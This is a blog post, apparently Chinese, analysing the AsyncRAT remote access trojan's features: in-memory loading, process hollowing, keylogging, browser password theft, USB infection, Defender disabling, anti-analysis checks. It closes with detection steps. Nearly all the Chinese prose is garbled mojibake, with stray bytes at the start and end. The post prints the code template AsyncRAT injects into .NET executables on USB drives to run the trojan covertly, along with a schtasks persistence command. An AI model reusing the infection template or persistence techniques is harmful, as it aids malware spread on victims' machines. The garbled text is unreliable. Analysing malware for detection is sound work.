I"¯?<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">AsyncRAT</a>æ˜¯ä¸€æ¬¾ä½¿ç”¨C Sharpå¼€å‘çš„C2å·¥å…·ï¼Œæœ¬æ–‡ä»…åœ¨æŠ€æœ¯ç ”ç©¶çš„è§’åº¦åˆ†æAsyncRATçš„æŠ€æœ¯ç»†èŠ‚ï¼Œä»‹ç»æ£€æµ‹æ–¹æ³•ã€‚</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æœ¬æ–‡é€‰æ‹©çš„AsyncRATæ›´æ–°æ—¥æœŸä¸º2020å¹´5æœˆ9æ—¥</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<ul>
  <li>AsyncRATçš„ä¼˜ç‚¹</li>
  <li>AsyncRATçš„æŠ€æœ¯ç»†èŠ‚</li>
  <li>æ£€æµ‹æ–¹æ³•</li>
</ul>

<h2 id="0x02-asyncratçš„ä¼˜ç‚¹">0x02 AsyncRATçš„ä¼˜ç‚¹</h2>
<hr />

<p><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">AsyncRAT</a>ä½¿ç”¨C Sharpå¼€å‘ï¼Œåº”ç”¨äºWindowsç³»ç»Ÿï¼Œå…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹:</p>

<ol>
  <li>æ”¯æŒä»Pastebin.comè¯»å–C2æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯</li>
  <li>æ”¯æŒå†…å­˜åŠ è½½PEæ–‡ä»¶</li>
  <li>æ”¯æŒåŠ¨æ€ç¼–è¯‘å¹¶æ‰§è¡ŒC#æˆ–è€…VBä»£ç </li>
  <li>æ”¯æŒUç›˜æ„ŸæŸ“ï¼Œèƒ½å¤Ÿæ„ŸæŸ“Uç›˜ä¸­æ‰€æœ‰ä½¿ç”¨.NETå¼€å‘çš„exeæ–‡ä»¶</li>
  <li>æ”¯æŒè‡ªåŠ¨è¯»å–Firefoxå’ŒChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </li>
  <li>é€šè¿‡æ¬ºéª—ç”¨æˆ·ç‚¹å‡»çš„æ–¹å¼ç»•è¿‡UACè¿›è¡Œææƒ</li>
  <li>é€šè¿‡C#æ¥å£æŠ€æœ¯ï¼Œæé«˜ç¨‹åºçš„æ‰©å±•æ€§ï¼Œåœ¨ç¨‹åºå®ç°ä¸Šå°†æ¯ä¸€ä¸ªåŠŸèƒ½å¯¹åº”ä¸€ä¸ªç±»ï¼Œç¼–è¯‘æˆdllæ–‡ä»¶ï¼Œåœ¨éœ€è¦åŠ è½½çš„æ—¶å€™ï¼Œç”±Serverå‘é€è‡³Clientï¼ŒClienté€šè¿‡Activator.CreateInstanceå°†ç±»å®ä¾‹åŒ–ï¼Œè¿›è€Œè°ƒç”¨ç±»çš„æ–¹æ³•ã€‚</li>
</ol>

<h2 id="0x03-asyncratçš„æŠ€æœ¯ç»†èŠ‚">0x03 AsyncRATçš„æŠ€æœ¯ç»†èŠ‚</h2>
<hr />

<p>æœ¬èŠ‚æŒ‰ç…§AsyncRATæ§åˆ¶é¢æ¿ä¸Šçš„åŠŸèƒ½é€ä¸ªè¿›è¡Œåˆ†æï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-20/2-1.png" alt="Alt text" /></p>

<h3 id="1sendfile">1.SendFile</h3>

<p>(1)ToMemory</p>

<p>å†…å­˜åŠ è½½exeæ–‡ä»¶ï¼Œæ”¯æŒä»¥ä¸‹ä¸¤ç§ç±»å‹:</p>

<ol>
  <li>Reflection</li>
</ol>

<p>ä½¿ç”¨Assembly.LoadåŠ è½½C#ç¨‹åº</p>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">ã€Šä»å†…å­˜åŠ è½½.NETç¨‹åºé›†(Assembly.Load)çš„åˆ©ç”¨åˆ†æã€‹</a></p>

<ol>
  <li>RunPE</li>
</ol>

<p>é€šè¿‡æ›¿æ¢è¿›ç¨‹å†…å­˜çš„æ–¹å¼åŠ è½½exeæ–‡ä»¶</p>

<p>å¯é€‰æ‹©ä»¥ä¸‹ç¨‹åºä½œä¸ºè¢«æ³¨å…¥çš„ç¨‹åºï¼š</p>

<ul>
  <li>aspnet_compiler.exe</li>
  <li>RegAsm.exe</li>
  <li>MSBuild.exe</li>
  <li>RegSvcs.exe</li>
  <li>vbc.exe</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»¥ä¸Š5ä¸ªexeæ–‡ä»¶ä½äºMicrosoft.NET Frameworkçš„å®‰è£…ç›®å½•ï¼ŒåŒAsyncClient.exeçš„ä½æ•°ä¿æŒä¸€è‡´</p>

<p>ä½¿ç”¨32ä½çš„AsyncClient.exeåå¼¹å›çš„Sessionï¼Œé»˜è®¤ä¼šå¯»æ‰¾32ä½Microsoft.NET Frameworkçš„å®‰è£…ç›®å½•ï¼Œä¾‹å¦‚ï¼šC:\Windows\Microsoft.NET\Framework\v4.0.30319</p>

<p>ä½¿ç”¨64ä½çš„AsyncClient.exeåå¼¹å›çš„Sessionï¼Œé»˜è®¤ä¼šå¯»æ‰¾64ä½Microsoft.NET Frameworkçš„å®‰è£…ç›®å½•ï¼Œä¾‹å¦‚ï¼šC:\Windows\Microsoft.NET\Framework64\v4.0.30319</p>

<p>RunPEæ“ä½œå°†å¯åŠ¨ä»¥ä¸Š5ä¸ªexeæ–‡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œé€šè¿‡ReadProcessMemoryã€VirtualAllocExã€WriteProcessMemoryå’ŒResumeThreadå®ç°å¯¹è¿›ç¨‹å†…å­˜çš„ä¿®æ”¹ï¼Œæ›¿æ¢æˆè¦åŠ è½½çš„exeæ–‡ä»¶</p>

<p>è¿™é‡Œéœ€è¦æ³¨æ„è¦åŠ è½½çš„exeæ–‡ä»¶éœ€è¦åŒAsyncClient.exeçš„ä½æ•°ä¿æŒä¸€è‡´</p>

<p>ä½¿ç”¨32ä½çš„AsyncClient.exeåå¼¹å›çš„Sessionï¼Œä½¿ç”¨RunPEæ“ä½œåªèƒ½åŠ è½½32ä½çš„exeæ–‡ä»¶</p>

<p>ä½¿ç”¨64ä½çš„AsyncClient.exeåå¼¹å›çš„Sessionï¼Œä½¿ç”¨RunPEæ“ä½œåªèƒ½åŠ è½½64ä½çš„exeæ–‡ä»¶</p>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B">ã€Šå‚€å„¡è¿›ç¨‹çš„å®ç°ä¸æ£€æµ‹ã€‹</a></p>

<p>(2)ToDisk</p>

<p>å°†exeæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºçš„<code class="language-plaintext highlighter-rouge">%Temp%</code>ç›®å½•ï¼Œé‡å‘½åä¸ºéšæœºå­—ç¬¦ä¸²ï¼Œå†ä½¿ç”¨Powershellå¯åŠ¨exeæ–‡ä»¶ï¼Œæ‰§è¡Œåä¸ä¼šåˆ é™¤<code class="language-plaintext highlighter-rouge">%Temp%</code>ç›®å½•ä¸‹çš„exeæ–‡ä»¶</p>

<h3 id="2-monitoring">2. Monitoring</h3>

<p>(1)Remote Desktop</p>

<p>ç›‘æ§å±å¹•ï¼Œå®æ—¶è·å¾—ç›®æ ‡æ¡Œé¢çš„å†…å®¹(åªèƒ½ç›‘æ§ï¼Œæ— æ³•æ“ä½œ)</p>

<p>è°ƒç”¨Graphicsç±»çš„CopyFromScreenå®ç°å±å¹•æˆªå›¾</p>

<p>é€šè¿‡Pythonå®ç°ç›‘æ§å±å¹•çš„ç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%B1%8F%E5%B9%95%E6%8E%A7%E5%88%B6">ã€ŠPupyåˆ©ç”¨åˆ†æâ€”â€”Windowså¹³å°ä¸‹çš„å±å¹•æ§åˆ¶ã€‹</a></p>

<p>(2)Keylogger</p>

<p>å®æ—¶è·å¾—ç›®æ ‡ä¸»æœºé”®ç›˜è¾“å…¥çš„æ¶ˆæ¯å’Œè¿›ç¨‹åç§°</p>

<p>é€šè¿‡hookçš„æ–¹å¼å®ç°é”®ç›˜è®°å½•</p>

<p>(3)Password Recovery</p>

<p>è·å¾—Firefoxå’ŒChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </p>

<p>æŠ€æœ¯ç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€Šæ¸—é€æŠ€å·§â€”â€”å¯¼å‡ºFirefoxæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ã€‹</a>å’Œ<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€Šæ¸—é€æŠ€å·§â€”â€”å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ã€‹</a></p>

<p>(4)File Manager</p>

<p>æ–‡ä»¶ç®¡ç†ï¼Œè¿˜æ”¯æŒéšè”½å®‰è£…7zipå’Œå¯¹æ–‡ä»¶çš„å‹ç¼©åŠè§£å‹ç¼©</p>

<p>éšè”½å®‰è£…7zipçš„æ–¹å¼ï¼š</p>

<p>åœ¨<code class="language-plaintext highlighter-rouge">%Temp%</code>ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹7-Zipï¼Œé‡Šæ”¾æ–‡ä»¶7z.exeå’Œ7z.dll</p>

<p>(5)Process Manager</p>

<p>è¿›ç¨‹ç®¡ç†ï¼Œæ”¯æŒæŸ¥çœ‹è¿›ç¨‹å’Œå…³é—­è¿›ç¨‹</p>

<p>(6)Report Window</p>

<p>ç›‘æ§é‡è¦è¿›ç¨‹ï¼Œå½“ç›®æ ‡ä¸»æœºä¸Šè¿è¡ŒæŒ‡å®šè¿›ç¨‹æ—¶ï¼Œæ§åˆ¶ç«¯å¼¹å‡ºæç¤ºæ¶ˆæ¯</p>

<p>(7)Webcam</p>

<p>å¼€å¯æ‘„åƒå¤´</p>

<h3 id="3miscellaneous">3.Miscellaneous</h3>

<p>(1)Bots Killer</p>

<p>æ¸…é™¤è‡ªèº«è¿›ç¨‹åœ¨æ³¨å†Œè¡¨HKLMå’ŒHKCUä¸‹<code class="language-plaintext highlighter-rouge">\Software\Microsoft\Windows\CurrentVersion\Run</code>å’Œ<code class="language-plaintext highlighter-rouge">Software\Microsoft\Windows\CurrentVersion\RunOnce</code>ä¿å­˜çš„é¡¹</p>

<p>(2)USB Spread</p>

<p>å½“ç›®æ ‡ä¸»æœºè¿æ¥Uç›˜æ—¶ï¼Œæ„ŸæŸ“Uç›˜ä¸­çš„æ–‡ä»¶</p>

<p>å°†æœ¨é©¬å®¢æˆ·ç«¯å¤åˆ¶åˆ°Uç›˜ä¸­å¹¶éšè—ï¼Œé»˜è®¤ä¿å­˜çš„åç§°ä¸ºLimeUSB.exe</p>

<p>ä¿®æ”¹Uç›˜ä¸­æ‰€æœ‰ä½¿ç”¨.NETå¼€å‘çš„exeæ–‡ä»¶ï¼Œé€šè¿‡CSharpCodeProvideræ”¹å˜ç¨‹åºè¿è¡Œæµç¨‹ï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTrademark("%Lime%")]
[assembly: Guid("%Guid%")]

static class %LimeUSBModule%
{
    public static void Main()
    {
        try
        {
            System.Diagnostics.Process.Start(@"%File%");
        }
        catch { }
        try
        {
            System.Diagnostics.Process.Start(@"%Payload%");
        }
        catch { }
    }
}
</code></pre></div></div>

<p>ç”¨æˆ·åœ¨å¯åŠ¨æ­£å¸¸æ–‡ä»¶çš„åŒæ—¶ä¼šéšè”½æ‰§è¡ŒUç›˜ä¸­çš„æœ¨é©¬å®¢æˆ·ç«¯</p>

<p>(3)Seed Torrent</p>

<p>å‘ç›®æ ‡ä¸»æœºå‘é€ç§å­æ–‡ä»¶å¹¶ä¸‹è½½</p>

<p>ç›®æ ‡ä¸»æœºéœ€è¦å®‰è£…uTorrentæˆ–è€…BitTorrent</p>

<p>(4)Remote Shell</p>

<p>å¼¹å‡ºä¸€ä¸ªäº¤äº’å¼çš„cmdçª—å£</p>

<p>(5)DOS Attack</p>

<p>å‘æŒ‡å®šåŸŸåæŒç»­å‘é€HTTPæ•°æ®åŒ…</p>

<p>(6)Execute .NET Code</p>

<p>åœ¨ç›®æ ‡ä¸»æœºä¸ŠåŠ¨æ€ç¼–è¯‘C#æˆ–è€…VBä»£ç å¹¶æ‰§è¡Œ</p>

<p>æ¨¡æ¿æ–‡ä»¶åŒ…å«å¼¹æ¡†å’Œä¸‹è½½æ‰§è¡Œçš„åŠŸèƒ½</p>

<p>æˆ‘æå–å‡ºäº†å…¶ä¸­ç¼–è¯‘C#ä»£ç å¹¶æ‰§è¡Œçš„åŠŸèƒ½ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Reflection;
namespace CodeDomProviderTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string source = @"
using System;
using System.Windows.Forms;
namespace AsyncRAT
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                MessageBox.Show(""Hello World"");
            }
            catch { }
        }
}
}";
            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");  
            try
            {              
                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";

                var compilerParameters = new CompilerParameters();
                compilerParameters.ReferencedAssemblies.Add("system.dll");
                compilerParameters.ReferencedAssemblies.Add("system.windows.forms.dll");
                compilerParameters.GenerateExecutable = true;
                compilerParameters.GenerateInMemory = true;
                compilerParameters.CompilerOptions = compilerOptions;
                compilerParameters.TreatWarningsAsErrors = false;
                compilerParameters.IncludeDebugInformation = false;

                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);
                if (compilerResults.Errors.Count &gt; 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        Console.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                        break;
                    }
                }
                else
                {
                    Assembly assembly = compilerResults.CompiledAssembly;
                    MethodInfo methodInfo = assembly.EntryPoint;
                    object injObj = assembly.CreateInstance(methodInfo.Name);
                    object[] parameters = new object[1];
                    if (methodInfo.GetParameters().Length == 0)
                    {
                        parameters = null;
                    }
                    methodInfo.Invoke(injObj, parameters);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
</code></pre></div></div>

<p>(7)Files Searcher</p>

<p>æœç´¢æŒ‡å®šåç¼€åçš„æ–‡ä»¶å¹¶æ‰“åŒ…æˆzipæ–‡ä»¶</p>

<h3 id="4extra">4.Extra</h3>

<p>(1)Visit Website</p>

<p>å¯åŠ¨é»˜è®¤æµè§ˆå™¨å¹¶è®¿é—®æŒ‡å®šURLï¼Œç•Œé¢ä¸éšè—</p>

<p>(2)Send MessageBox</p>

<p>åœ¨ç›®æ ‡ä¸»æœºä¸Šå¼¹å‡ºå¯¹è¯æ¡†</p>

<p>(3)Chat</p>

<p>åœ¨ç›®æ ‡ä¸»æœºä¸Šå¼¹å‡ºå¯¹è¯æ¡†ï¼Œå®æ—¶æ˜¾ç¤ºè¾“å…¥çš„å†…å®¹</p>

<p>(4)Get Admin Privileges</p>

<p>ä½¿ç”¨cmd.exeä»¥Adminæƒé™é‡æ–°å¯åŠ¨æœ¨é©¬å®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ“ä½œä¼šåœ¨ç”¨æˆ·æ¡Œé¢å¼¹å‡ºUACæ¡†ï¼Œéœ€è¦ç”¨æˆ·é€‰æ‹©å…è®¸åæ‰èƒ½è¿è¡Œ</p>

<p>å¦‚æœç”¨æˆ·æœªé€‰æ‹©å…è®¸ï¼Œä¼šä¸€ç›´å¼¹å‡ºUACå¯¹è¯æ¡†</p>

<p>UACå¯¹è¯æ¡†çš„ç¨‹åºä½ç½®ä¼šæš´éœ²æœ¨é©¬å®¢æˆ·ç«¯çš„è·¯å¾„</p>

<p>å¦‚æœæƒ³è¦ä¼ªé€ ä¸€ä¸ªæ›´åŠ å¯ä¿¡çš„UACå¯¹è¯æ¡†(ä¸æš´éœ²ç¨‹åºä½ç½®)å¯ä»¥å‚è€ƒä¹‹å‰æ–‡ç« ã€ŠA dirty way of tricking users to bypass UACã€‹ä¸­çš„æ€è·¯</p>

<p>(5)Blank Screen</p>

<p>RunåŠŸèƒ½ï¼š</p>

<p>é€šè¿‡WinAPI CreateDesktop()åˆ›å»ºä¸€ä¸ªéšæœºåç§°çš„è™šæ‹Ÿæ¡Œé¢ï¼Œå†…å®¹ä¸ºç©ºï¼Œå½“åˆ‡æ¢åˆ°è¿™ä¸ªç©ºçš„è™šæ‹Ÿæ¡Œé¢æ—¶ï¼Œç”¨æˆ·æ— æ³•å¯¹æ¡Œé¢è¿›è¡Œæ“ä½œ</p>

<p>StopåŠŸèƒ½ï¼š</p>

<p>é€šè¿‡WinAPI SwitchDesktop()åˆ‡æ¢åˆ°åŸæ¥çš„æ¡Œé¢</p>

<p>(6)Disable Windows Defender</p>

<p>é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å…³é—­Windows Defenderï¼Œé€šå¸¸åœ¨Win10ç³»ç»Ÿä¸Šä½¿ç”¨</p>

<p>(7)Set Wallpaper</p>

<p>è®¾ç½®ç”¨æˆ·çš„æ¡Œé¢</p>

<h3 id="5server">5.Server</h3>

<p>Block Clients</p>

<p>æ‹’ç»æŒ‡å®šIPå›è¿çš„æœ¨é©¬å®¢æˆ·ç«¯</p>

<h3 id="6builder">6.Builder</h3>

<p>(1)Connection</p>

<p>DNSï¼šæŒ‡å®šC2 Serverçš„IPï¼Œå¯ä»¥è®¾ç½®å¤šä¸ª</p>

<p>Portï¼šæŒ‡å®šC2 Serverçš„ç«¯å£ï¼Œå¯ä»¥è®¾ç½®å¤šä¸ª</p>

<p>Pastebinï¼šä»Pastebin.comè¯»å–C2 Serverçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬DNSå’ŒPort</p>

<p>å†…å®¹ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6606:7707:8808
</code></pre></div></div>

<p>(2)Install</p>

<p>ç”¨ä½œé…ç½®æœ¨é©¬å®¢æˆ·ç«¯è‡ªå¯åŠ¨çš„åŠŸèƒ½</p>

<p>å¼€å¯è¿™ä¸ªåŠŸèƒ½åä¼šå°†æœ¨é©¬å®¢æˆ·ç«¯å¤åˆ¶åˆ°æŒ‡å®šä½ç½®</p>

<p>æ–‡ä»¶åç§°å¯ä»¥é‡æ–°å‘½å</p>

<p>æ–‡ä»¶è·¯å¾„å¯é€‰æ‹©<code class="language-plaintext highlighter-rouge">%AppData%</code>æˆ–<code class="language-plaintext highlighter-rouge">%Temp%</code>ç›®å½•</p>

<p>å½“æœ¨é©¬å®¢æˆ·ç«¯ä»¥æ™®é€šç”¨æˆ·æƒé™æ‰§è¡Œæ—¶ï¼Œä¼šåœ¨æ³¨å†Œè¡¨<code class="language-plaintext highlighter-rouge">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>æ·»åŠ é¡¹ï¼Œä»¥æ–°çš„æœ¨é©¬å®¢æˆ·ç«¯åç§°ä½œä¸ºæ³¨å†Œè¡¨é¡¹çš„åç§°ï¼Œä»¥æ–°çš„æœ¨é©¬å®¢æˆ·ç«¯è·¯å¾„ä½œä¸ºæ³¨å†Œè¡¨é¡¹çš„æ•°æ®</p>

<p>å½“æœ¨é©¬å®¢æˆ·ç«¯ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œæ—¶ï¼Œä¼šä½¿ç”¨schtaskså‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œå‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /f /sc onlogon /rl highest /tn &lt;name&gt; /tr &lt;path&gt;
</code></pre></div></div>

<p>è®¡åˆ’ä»»åŠ¡çš„åç§°ä¸ºæ–°çš„æœ¨é©¬å®¢æˆ·ç«¯åç§°ï¼Œä¼šåœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œè®¡åˆ’ä»»åŠ¡</p>

<p>(3)Misc</p>

<p>Groupï¼šå¯¹æœ¨é©¬å®¢æˆ·ç«¯è¿›è¡Œåˆ†ç±»</p>

<p>Mutexï¼šè®¾ç½®äº’æ–¥é‡ï¼Œé¿å…æœ¨é©¬å®¢æˆ·ç«¯çš„é‡å¤å¯åŠ¨</p>

<p>Anti Analysisï¼š</p>

<p>åŒ…æ‹¬ä»¥ä¸‹åŠŸèƒ½ï¼š</p>

<ul>
  <li>DetectManufacturerï¼Œé€šè¿‡WMIè·å¾—ç³»ç»Ÿä¿¡æ¯(<code class="language-plaintext highlighter-rouge">Select * from Win32_ComputerSystem</code>)ï¼ŒæŸ¥çœ‹Manufactureræ˜¯å¦åŒ…å«å­—ç¬¦VIRTUALã€vmwareæˆ–VirtualBox</li>
  <li>DetectDebuggerï¼Œä½¿ç”¨WinApi CheckRemoteDebuggerPresent()æ£€æŸ¥æ˜¯å¦ä¸ºè°ƒè¯•å™¨</li>
  <li>DetectSandboxieï¼Œä½¿ç”¨WinApi GetModuleHandle()æ£€æŸ¥SbieDll.dllæ˜¯å¦å­˜åœ¨</li>
  <li>IsSmallDiskï¼Œæ£€æŸ¥ç¡¬ç›˜å¤§å°æ˜¯å¦å°äº60Gb</li>
  <li>IsXPï¼Œæ£€æŸ¥ç³»ç»Ÿåç§°æ˜¯å¦åŒ…å«å­—ç¬¦xp</li>
</ul>

<p>Process Criticaï¼š</p>

<p>å°†è¿›ç¨‹è®¾ç½®ä¸ºä¿æŠ¤è¿›ç¨‹ï¼Œå¦‚æœæ„å¤–å…³é—­äº†ä¿æŠ¤è¿›ç¨‹ï¼Œé‚£ä¹ˆå°†å¯¼è‡´BSOD</p>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">ã€Šç»“æŸè¿›ç¨‹å¯¼è‡´BSODçš„åˆ©ç”¨åˆ†æã€‹</a></p>

<p>Delayï¼šå»¶è¿Ÿæ‰§è¡Œçš„æ—¶é—´</p>

<p>(4)Assembly</p>

<p>å¯ä»¥æ‰‹åŠ¨è®¾ç½®æ–‡ä»¶å±æ€§ï¼Œä¹Ÿå¯ä»¥å¤åˆ¶æŒ‡å®šæ–‡ä»¶çš„æ–‡ä»¶å±æ€§</p>

<p>(5)Icon</p>

<p>è®¾ç½®æ–‡ä»¶å›¾æ ‡</p>

<p>(6)Build</p>

<p>Simple Obfuscatorï¼šé€šè¿‡é‡å‘½åçš„æ–¹å¼å®ç°ç®€å•çš„æ··æ·†</p>

<p>å…³é”®ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       private static ModuleDefMD RenamingObfuscation(ModuleDefMD inModule)
        {
            ModuleDefMD module = inModule;
            IRenaming rnm = new NamespacesRenaming();
            module = rnm.Rename(module);
            rnm = new ClassesRenaming();
            module = rnm.Rename(module);
            rnm = new MethodsRenaming();
            module = rnm.Rename(module);
            rnm = new PropertiesRenaming();
            module = rnm.Rename(module);
            rnm = new FieldsRenaming();
            module = rnm.Rename(module);
            return module;
        }
    }
</code></pre></div></div>

<h2 id="0x04-æ£€æµ‹æ–¹æ³•">0x04 æ£€æµ‹æ–¹æ³•</h2>
<hr />

<p>1.æŸ¥æ‰¾å¯ç–‘æ–‡ä»¶</p>

<p>è·¯å¾„ï¼š<code class="language-plaintext highlighter-rouge">%AppData%</code>å’Œ<code class="language-plaintext highlighter-rouge">%Temp%</code>ç›®å½•</p>

<p>2.ä½¿ç”¨Autorunsæ£€æŸ¥å¯ç–‘çš„å¯åŠ¨é¡¹</p>

<p>(1)æ³¨å†Œè¡¨ä½ç½®</p>

<ul>
  <li>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</li>
  <li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</li>
</ul>

<p>(2)è®¡åˆ’ä»»åŠ¡åˆ—è¡¨</p>

<p>3.åå°å¯ç–‘è¿›ç¨‹</p>

<p>AsyncRATçš„æœ¨é©¬å®¢æˆ·ç«¯åªæœ‰exeæ–‡ä»¶ä¸€ç§å½¢å¼ï¼Œåœ¨è¿è¡Œæ—¶ä¼šäº§ç”Ÿå¯ç–‘çš„è¿›ç¨‹</p>

<p>4.é€šä¿¡æµé‡</p>

<p>æŸ¥çœ‹å¯ç–‘è¿›ç¨‹å¯¹å¤–é€šä¿¡æµé‡</p>

<p>5.ä½¿ç”¨æ€æ¯’è½¯ä»¶</p>

<p>ç›®å‰æ€æ¯’è½¯ä»¶å‡ä¼šå¯¹AsyncRATè¿›è¡Œæ‹¦æˆª</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡åœ¨æŠ€æœ¯ç ”ç©¶çš„è§’åº¦åˆ†æAsyncRATçš„æŠ€æœ¯ç»†èŠ‚ï¼Œä»‹ç»æ£€æµ‹æ–¹æ³•ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET